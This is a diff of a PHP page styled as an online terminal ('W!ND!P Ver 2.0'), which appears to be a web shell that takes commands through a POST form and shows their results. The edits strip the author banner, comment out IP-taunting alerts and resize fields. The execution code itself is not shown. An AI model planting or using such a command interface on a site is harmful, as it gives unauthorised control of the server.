@@ -1,12 +1,3 @@
-<?php
-/*
-
-An Online Look-A-Like Terminal By An0n 3xPloiTeR ^_^
-Editing Name Wont Make You The Author
-#Respect #Coderz
-
-*/
-?>
 <!DOCTYPE html>
 <html lang="en">
 	<head>
@@ -20,13 +11,13 @@ Editing Name Wont Make You The Author
 		<meta content='width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1' name='viewport'/>
 		<meta http-equiv="refresh" content="" /><!-- For refreshing page after ___ intervals of time -->
 		<script language="Javascript1.2">
-			function njs_nodroit() {
-				alert ("W!ND!P Made By An0n 3xPloiTeR");
-				alert ("There are no copyrights. You Can Share iT Freely :D");
-				alert ("But Copying Someone\'s Work is a Bad Idea :\'(");
-				alert ("Got Your Ip: <?php $ip = $_SERVER['REMOTE_ADDR']; echo $ip; ?> And Reported To An0n 3xPloiTeR :-)");
-				return false;
-			} document.oncontextmenu = njs_nodroit;
+			// function njs_nodroit() {
+			// 	alert ("W!ND!P Made By An0n 3xPloiTeR");
+			// 	alert ("There are no copyrights. You Can Share iT Freely :D");
+			// 	alert ("But Copying Someone\'s Work is a Bad Idea :\'(");
+			// 	alert ("Got Your Ip: <?php $ip = $_SERVER['REMOTE_ADDR']; echo $ip; ?> And Reported To An0n 3xPloiTeR :-)");
+			// 	return false;
+			// } document.oncontextmenu = njs_nodroit;
 		</script>
 		<style>
 			body {
@@ -90,7 +81,7 @@ Editing Name Wont Make You The Author
 			<font>W!ND!P Ver 2.0</font>
 		</div>
 		<div class="results">
-			<textarea placeholder="Results Will Appeare Here :)" type="text" name="results" rows="20" cols="160%"><?php
+			<textarea placeholder="Results Will Appeare Here :)" type="text" name="results" rows="20" cols="130"><?php
 				if (isset($_POST['input'])) {
 				$input = htmlspecialchars($_POST['input']);
 				$host = $_SERVER['HTTP_HOST'];
@@ -125,7 +116,7 @@ Editing Name Wont Make You The Author
 		</div>
 		<div class="input">
 			<form action="" method="POST">
-				<input type="text" name="input" placeholder="Commands Here" size="115" />
+				<input type="text" name="input" placeholder="Commands Here" size="100" />
 			</form>
 		</div>
 	</body>
